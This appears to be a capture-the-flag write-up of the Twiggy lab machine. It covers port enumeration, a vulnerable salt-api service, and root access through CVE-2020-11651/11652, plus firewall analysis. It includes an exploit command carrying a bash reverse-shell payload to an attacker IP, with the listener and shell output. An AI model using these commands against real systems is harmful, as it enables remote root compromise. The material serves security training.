#box #ZeroMQ #HTTP-Headers-RCE #salt-api #iptables

Twiggy is an easy box that has a difficulty given by the fact that the firewall on that machine prevents connection from all non explicited ports in the IPTables file. Once used an available port we'll be able to get a reverse shell as root.
## Nmap

Our usual nmap scan with `nmap -sCV --min-rate=10000 192.168.231.62` tricks us because it doesn't show us all the open ports. To properly get all the available port we then opted for `nmap -p- 192.168.231.62` (we then added -sCV when we knew what else was open not to slow down the scan)
```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-25 15:58 UTC
Nmap scan report for 192.168.231.62
Host is up (0.042s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 44:7d:1a:56:9b:68:ae:f5:3b:f6:38:17:73:16:5d:75 (RSA)
|   256 1c:78:9d:83:81:52:f4:b0:1d:8e:32:03:cb:a6:18:93 (ECDSA)
|_  256 08:c9:12:d9:7b:98:98:c8:b3:99:7a:19:82:2e:a3:ea (ED25519)
53/tcp   open  domain  NLnet Labs NSD
80/tcp   open  http    nginx 1.16.1
|_http-title: Home | Mezzanine
|_http-server-header: nginx/1.16.1
4505/tcp open  zmtp    ZeroMQ ZMTP 2.0
4506/tcp open  zmtp    ZeroMQ ZMTP 2.0
8000/tcp open  http    nginx 1.16.1
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Site doesn't have a title (application/json).
|_http-server-header: nginx/1.16.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.39 seconds
```

While ZeroMQ ZMTP 2.0, if searched only for vulnerabilities can retrieve our target vulnerability, the proper way to understand who's vulnerable here is by looking at hosted service's headers

## Port 8000

On port 8000 we can find a service hosted on a nginx webserver. Nothing too great comes from enumerating it, but by looking at the requests' header we notice an unusual response header

![[attachments/twiggy-writeup-1.webp]]

It also responds with `salt-api/3000-1`, by looking online at it, the first result that comes up is a RCE vulnerability combining two CVE: [CVE-2020-11651/CVE-2020-11652](https://www.exploit-db.com/exploits/48421).

## Leveraging CVE-2020-11651/2 to get a Foothold

Various POC comes up when looking for that CVE, the most reliable feels to be the following one since it fixes an issue with python's `tracemalloc` function. [CVE-2020-11652-POC](https://github.com/limon768/CVE-2020-11652-POC/tree/main)

Once downloaded we run the following command:

```bash
python3 CVE-2020-11652-fix.py --master 192.168.231.62 --exec-choose master --exec-cmd "bash -i >& /dev/tcp/192.168.45.249/1337 0>&1"
```

and...we notice we ain't getting a shell.
After more and more on tries on different shells, we try to execute a shell with port `4505`, one of the open ports on the target machine (it could've worked with any other, 80, 4506, 8000, 22, 53), getting a shell easily and, more importantly as **root**

```bash
[target] ~ python3 CVE-2020-11652-fix.py --master 192.168.231.62 --exec-choose master --exec-cmd "bash -i >& /dev/tcp/192.168.45.249/80 0>&1"

[172.19.0.2|192.168.45.249] [root] [~/.ssh] > nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.45.249] from (UNKNOWN) [192.168.231.62] 37670
bash: no job control in this shell
[root@twiggy root]# 
```

## Post Escalation Investigation

Once logged in, we try to investigate on the reasons why our shell wasn't working and we happen to find some interesting IPTables rules:

```bash
Chain INPUT (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         
3385K  454M ACCEPT     all  --  lo     *       0.0.0.0/0            0.0.0.0/0           
 767K   95M ACCEPT     all  --  *      *       0.0.0.0/0            0.0.0.0/0            ctstate NEW,RELATED,ESTABLISHED
    0     0 ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:22
    0     0 ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:53
    5   200 ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:80
    0     0 ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:4505
    0     0 ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:4506
    0     0 ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:8000
    0     0 ACCEPT     udp  --  *      *       0.0.0.0/0            0.0.0.0/0            udp dpt:53
    0     0 ACCEPT     icmp --  *      *       0.0.0.0/0            0.0.0.0/0            icmptype 8
    0     0 ACCEPT     icmp --  *      *       0.0.0.0/0            0.0.0.0/0            icmptype 0
    0     0 DROP       all  --  *      *       0.0.0.0/0            0.0.0.0/0           

Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         

Chain OUTPUT (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         
3385K  454M ACCEPT     all  --  *      lo      0.0.0.0/0            0.0.0.0/0           
    0     0 ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:22 state NEW,ESTABLISHED
   75 15102 ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp spt:22 state NEW,ESTABLISHED
   12   734 ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:53 state NEW,ESTABLISHED
   27  1636 ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp spt:53 state NEW,ESTABLISHED
    0     0 ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:80 state NEW,ESTABLISHED
 386K  429M ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp spt:80 state NEW,ESTABLISHED
 1743 8965K ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:4505 state NEW,ESTABLISHED
   40  2666 ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp spt:4505 state NEW,ESTABLISHED
    0     0 ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:4506 state NEW,ESTABLISHED
 1067  108K ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp spt:4506 state NEW,ESTABLISHED
    0     0 ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:8000 state NEW,ESTABLISHED
 301K  241M ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp spt:8000 state NEW,ESTABLISHED
 3030  171K ACCEPT     udp  --  *      *       0.0.0.0/0            0.0.0.0/0            udp dpt:53 state NEW,ESTABLISHED
    0     0 ACCEPT     icmp --  *      *       0.0.0.0/0            0.0.0.0/0            icmptype 8
   20  1064 ACCEPT     icmp --  *      *       0.0.0.0/0            0.0.0.0/0            icmptype 0
 158K 7268K DROP       all  --  *      *       0.0.0.0/0            0.0.0.0/0           
```

All the connections with ACCEPT are accepted both inbound and outbound.
The **DROP** rule, instead, specifies in that case that all NON-EXPLICITLY WRITTEN connections are by default dropped. IN this scenario it means that we can both send and receive from 22/53/80/4505/4506/8000/53 but we cannot neither send or receive from any other port. 